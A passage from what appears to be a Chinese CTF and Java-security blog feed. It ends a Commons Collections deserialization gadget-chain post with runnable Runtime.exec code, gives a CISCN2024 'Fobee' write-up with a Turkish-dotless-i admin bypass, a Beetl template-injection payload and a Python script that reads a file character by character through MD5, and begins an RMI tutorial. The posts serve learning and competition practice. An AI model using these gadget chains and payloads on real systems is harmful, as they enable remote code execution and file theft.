class_">HashMap</span>&lt;&gt;();<br><br>            Map&lt;String, Integer&gt; map1 = LazyMap.decorate(hashMap1, chain);<br>            map1.put(<span class="hljs-string">&quot;00&quot;</span>, <span class="hljs-number">1</span>);<br>            Map&lt;String, Integer&gt; map2 = LazyMap.decorate(hashMap2, chain);<br>            map2.put(<span class="hljs-string">&quot;.n&quot;</span>, <span class="hljs-number">1</span>);<br>            Hashtable&lt;Map&lt;String, Integer&gt;, Integer&gt; hashtable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>            hashtable.put(map1, <span class="hljs-number">1</span>);<br>            hashtable.put(map2, <span class="hljs-number">1</span>);<br>            map2.remove(<span class="hljs-string">&quot;00&quot;</span>);<br>            deserialize(serialize(hashtable));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> ChainedTransformer <span class="hljs-title function_">getChainedTransformer</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">ct</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class);<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it_exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>        );<br>        Transformer[] a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;ct, it1, it2, it_exec&#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(a);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>             <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos)) &#123;<br>            oos.writeObject(obj);<br>            <span class="hljs-keyword">return</span> baos.toByteArray();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes))) &#123;<br>            ois.readObject();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728232439088.png" alt="image-20240728232439088"></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><img src="/2024/07/28/Commons-Collections/image-20240728233307715.png" class="" title="image-20240728233307715"><p>由此CC链告一段落，CB链随缘再讲吧。</p><p>看完CC链只能说反序列化初步入门，实战调链子也会后续一步步写上的。</p><p>我一定要成为Java高手！！！！</p><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/commons-collection/">https://p4d0rn.gitbook.io/java/serial-journey/commons-collection/</a></p><p><a href="https://wx.zsxq.com/dweb2/index/tags/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/551511412514">https://wx.zsxq.com/dweb2/index/tags/Java安全漫谈/551511412514</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/125631391">Javaweb安全——反序列化漏洞-commons-collections4利用链（CC2和CC4）-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/127580121?ops_request_misc=%7B%22request_id%22:%22172217921116800225595414%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172217921116800225595414&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-127580121-null-null.nonecase&utm_term=CC5">Javaweb安全——反序列化漏洞-CC&amp;CB链思路整理-CSDN博客</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/16141397.html#commonscollections5">Java反序列化从URLDNS到CommonsCollections1-7 - KingBridge - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2024-Final-AWDP-Fobee</title>
    <link href="/2024/07/28/CISCN2024-Final-AWDP-Fobee/"/>
    <url>/2024/07/28/CISCN2024-Final-AWDP-Fobee/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次国赛算是爆种了，拿下了全国总冠军。</p><p><a href="https://mp.weixin.qq.com/s/HEdvNGKRnd0XBJwR8zAi4Q">微信公众平台 (qq.com)</a></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728004124171.png" alt="image-20240728004124171"></p><p>算是让天枢后继有人了吧。</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728004719598.png" alt="image-20240728004719598"></p><p>（领奖的那位是我hhhhh，在左二挨着川大网安院院长）</p><p>主要还是第二天的渗透比较适合我吧哈哈，天时地利人和，队友也很给力，最后直接一鼓作气冲到了榜首😀</p><p>渗透的wp不打算写，反正网上也有打的比我多一道题的写了wp，我们渗透是并列第二，据说云镜会上，到时候再看看能不能冲下DC了却当时的遗憾。</p><p>第一天的awdp的web，我就修了一个solon-master，那道的fix很简单，因为lib里可以发现snakeyaml和logback，直接把关键字snake和log给ban掉就可以了，然后我过滤得更狠，直接什么@、$、&lt; 这些常见打json格式的反序列化符号给ban了，所以意外的第三轮就拿下了fix，并列二血fix吧算，近乎是吃满了check🤭🤭🤭</p><p>唯独这个Fobee让我头疼，当时我几乎后面几个小时都在看这个，然而修出来的也只有几个队，打出来的也不过三个数。</p><p>其中一个打法是学长给的，这里做一下浅浅的复现（学长tql呜呜呜呜）</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先是看看代码逻辑：</p><p><strong>IndexController.java</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fobee;<br><br><span class="hljs-keyword">import</span> java.security.MessageDigest;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">import</span> org.beetl.core.BeetlKit;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Controller;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Mapping;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.ModelAndView;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CHARACTERS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> generateRandomString(<span class="hljs-number">10</span>);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">index</span><span class="hljs-params">(String username)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;index.htm&quot;</span>);<br>        <span class="hljs-keyword">if</span> (username != <span class="hljs-literal">null</span> &amp;&amp; !username.isEmpty() &amp;&amp; username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; !username.toLowerCase().equals(<span class="hljs-string">&quot;admin&quot;</span>)) &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;=====&quot;</span> + password + <span class="hljs-string">&quot;=====&quot;</span>);<br>            <span class="hljs-keyword">return</span> model;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>);<br>            <span class="hljs-keyword">return</span> model;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/render&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">render</span><span class="hljs-params">(String pass, String tp)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;render.htm&quot;</span>);<br>        <span class="hljs-keyword">if</span> (pass != <span class="hljs-literal">null</span> &amp;&amp; pass.equals(password)) &#123;<br>            <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(tp);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> BeetlKit.render(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decode), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br>            System.out.println(result);<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, getMD5Hash(result));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;Render Page&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> model;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/env&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">env</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateRandomString</span><span class="hljs-params">(<span class="hljs-type">int</span> length)</span> &#123;<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(length);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> random.nextInt(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.length());<br>            sb.append(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.charAt(index));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getMD5Hash</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException &#123;<br>        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);<br>        md.update(input.getBytes());<br>        <span class="hljs-type">byte</span>[] digest = md.digest();<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-type">byte</span>[] var4 = digest;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> digest.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> var4[var6];<br>            sb.append(String.format(<span class="hljs-string">&quot;%02x&quot;</span>, b &amp; <span class="hljs-number">255</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这几个路由基本一目了然，首先是要知道这个ModelAndView的默认传参是GET，传参都搞不明白基本可以告别了。</p><p>首先进去的根路由是需要你传参username，但是要满足：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">username != <span class="hljs-literal">null</span> &amp;&amp; !username.isEmpty() &amp;&amp; username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; !username.toLowerCase().equals(<span class="hljs-string">&quot;admin&quot;</span>)<br></code></pre></td></tr></table></figure><p>本来fix我是想下面反序列化修不动，在这里过滤狠一点，但是当然也是check不过。</p><p>它又要你是admin，又要你toLowerCase绕过不是admin，那怎么绕？？？</p><p>其实你打开IDEA，拖过去到toLowerCase，它自己就告诉你了：</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728001510929.png" alt="image-20240728001510929"></p><p>这个locale的不一致会导致一个字符有多种识别方式，这里就告诉你了 <strong>i</strong> 在LATIN SMALL LETTER重等效于 <strong>\u0131</strong> ,其实不需要深入理解，这里就能绕了，进去后就能那道password的回显。</p><p>我们接着看路由，下面的render路由，很容易看到attack的点在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(tp);<br><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> BeetlKit.render(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decode), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br></code></pre></td></tr></table></figure><p>首先是base64解密传参的tp，然后调用到BeetlKit.render进行渲染，其实应该就是个SSTI。</p><p>但是进入这里需要password，而上面若绕进去了就拿到了password，所以基本上就完成了。</p><p>怎么打SSTI呢，我们解包一下这个BeetlKit跟进一下：</p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002111368.png" class="" title="image-20240728002111368"><p>一个打模板注入的地方。</p><p>然而好像没有什么用，看不出来他要干啥，具体原理这里有篇文章可以看看：</p><p><a href="https://xz.aliyun.com/t/8695?time__1311=n4+xnD0DcDu7G=DCzGkDlhje3iKt4Y5feeEd4x">一次意外的代码审计—-JfinalCMS审计 - 先知社区 (aliyun.com)</a></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002358967.png" alt="image-20240728002358967"></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002405853.png" alt="image-20240728002405853"></p><p>这下SSTI会打了，其实就是利用这个接口实现恶意类加载，但是beetlKit过滤得有点狠，常规的直接打runtime行不通。</p><p>所以需要找到它内部什么玩意能调用runtime打成功，学长找到了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.antlr.v4.runtime.misc.Utils.readFile<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002829857.png" alt="image-20240728002829857"></p><p>显然这里可以直接读文件，但是回显需要类似盲注的手段，一个个字符读出来（tql学长wwwww），然后下面它会自己把读到的东西进行MD5加密并打在网页上。</p><p>这个&#x2F;env也可以看一下，反正都是jdk1.8所以意义不大。</p><p>所以思路就有了：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>、 根路由<span class="hljs-keyword">admin</span>绕过拿<span class="hljs-keyword">password</span><br><span class="hljs-number">2</span>、 带<span class="hljs-keyword">password</span>访问/render，tp使用base64加密的恶意注入payload读flag，由MD5格式爆出<br><span class="hljs-number">3</span>、 MD5一个个字符爆破<br></code></pre></td></tr></table></figure><p>看起来还挺简单，但是断网环境确实很折磨，总有那么几个环境问题，而且审计需要靠自己，比赛也很紧张，所以做出来的人确实很牛至了。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>这里我在vps上自搭环境测试：</p><p>先admin绕过，但是要url编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">&lt;url&gt;/?username=adm%C4%B1n<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003302893.png" alt="image-20240728003302893"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> hashlib<br><br>hash_string = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100000</span>):<br>    payload = base64.b64encode((<span class="hljs-string">&#x27;$&#123;@java.util.Arrays.toString(@org.antlr.v4.runtime.misc.Utils.readFile(&quot;/flag&quot;)).charAt(&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;)&#125;&#x27;</span>).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    rsp = requests.get(<span class="hljs-string">f&#x27;http://vps:8888/render?pass=FuTKLliOry&amp;tp=<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>)<br>    soup = BeautifulSoup(rsp.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    md5_element = soup.select_one(<span class="hljs-string">&#x27;div#title-desktop&#x27;</span>)<br>    <span class="hljs-keyword">if</span> md5_element <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        md5val = md5_element.text<br>        <span class="hljs-built_in">print</span>(md5val)<br>        hash_string.append(md5val)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>hash_string = <span class="hljs-string">&#x27;\n&#x27;</span>.join(hash_string)<br><br><span class="hljs-built_in">map</span> = <span class="hljs-built_in">dict</span>()<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string.printable:<br>    <span class="hljs-built_in">map</span>[hashlib.md5(c.encode()).hexdigest()] = c<br><br>val = hash_string.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(val))<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> cc <span class="hljs-keyword">in</span> val:<br>    <span class="hljs-keyword">if</span> cc <span class="hljs-keyword">in</span> <span class="hljs-built_in">map</span>:<br>        flag += <span class="hljs-built_in">map</span>[cc]<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>然后读文件一个个字符MD5爆破：</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003427355.png" alt="image-20240728003427355"></p><p>在此佩服一下学长的牛至做法，比赛场上俩学长都用类似这种方法做的，都tql~~~orz</p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI</title>
    <link href="/2024/07/18/RMI-JNDI/"/>
    <url>/2024/07/18/RMI-JNDI/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先了解一下啥是RMI。</p><p><code>RMI：Remote Method Invocation</code> 远程方法调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">RMI为应用提供了远程调用的接口（Java的RPC框架）<br>调用远程位置对象的方法<br>实现RMI的协议叫JRMP<br>RMI实现过程存在Java对象的传递，因此涉及到反序列化<br></code></pre></td></tr></table></figure><p>基本上从java反序列化取经出来，遇到且绕不开的应该是各个CC链，而且很多的java反序列化非常具有缝合怪的风格，在前期学业压力下没办法系统归纳，知识也零零散散，这里就做一个系统化的复盘。</p><p>但是CC链太具有代表性了，所以我想先写写我第一次打到java题的时候遇到的RMI&#x2F;JNDI问题，就是NCTF2023的logging签到题，那道log4j虽然很简单地打accept头就能RCE，但是起的工具也就是JNDI注入的工具，所以让我记忆犹新。</p><p>然而光靠工具小子当然是不能解决问题的，大多是的EXP都是现场动调而手导手写，而且线下断网环境注定不能反弹shell而则必须使用内存马也使得java在web题内最少解的情况，国赛也遇到了触目惊心的零解。反射和类加载我就不再赘述，因为这算是最基本的java反序列化入门知识。</p><p>为屏蔽网络通信的复杂性，RMI引入两个概念，客户端存根Stub和服务端骨架Skeleton</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">当<span class="hljs-variable">Client</span>试图调用一个远端的<span class="hljs-variable">Object</span>，实际调用的是客户端本地的一个代理类（就是<span class="hljs-built_in">Stub</span>）<br><br>调用<span class="hljs-variable">Server</span>的目标类之前，会经过一个远端代理类（就是<span class="hljs-built_in">Skeleton</span>），它从<span class="hljs-built_in">Stub</span>接收远程方法调用并传递给真正的目标类<br><br><span class="hljs-built_in">Stub</span>和<span class="hljs-built_in">Skeleton</span>的调用对于<span class="hljs-variable">RMI</span>服务的使用者是隐藏的<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/1.png" alt="1"></p><p><img src="/2024/07/18/RMI-JNDI/2.png" alt="2"></p><p><strong>代码规则</strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">客户端和服务端都需定义用于远程调用的接口<br><br>接口必须继承`java.rmi.Remote`接口<br><br>接口中的方法都要抛出`java.rmi.RemoteException`异常<br><br>服务端创建接口实现类，实现接口定义的方法<br><br>实现类继承`java.rmi.server.UnicastRemoteObject`<br></code></pre></td></tr></table></figure><p>这里要求实现类继承<code>UnicastRemoteObject</code>，方便自动将这个远程对象导出供客户端调用</p><p>当然不继承也行，但后面得手动调用<code>UnicastRemoteObject#exportObject</code>，导出对象时可以指定监听端口来接收<code>incoming calls</code>，默认为随机端口。由上图可知远程对象会被注册到<code>RMI Registry</code>中，所以实际上不需要通过注册中心，只要我们知道导出的远程对象监听的端口号，也可以和它直接通信。</p><p><code>RMI Registry</code>注册中心存储着远程对象的引用（Reference）和其绑定的名称（Name），客户端通过名称找到远程对象的引用（Reference），再由这个引用就可以调用到远程对象了。</p><h2 id="步骤代码"><a href="#步骤代码" class="headerlink" title="步骤代码"></a>步骤代码</h2><p><strong>Server</strong></p><p>需要远程调用的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> 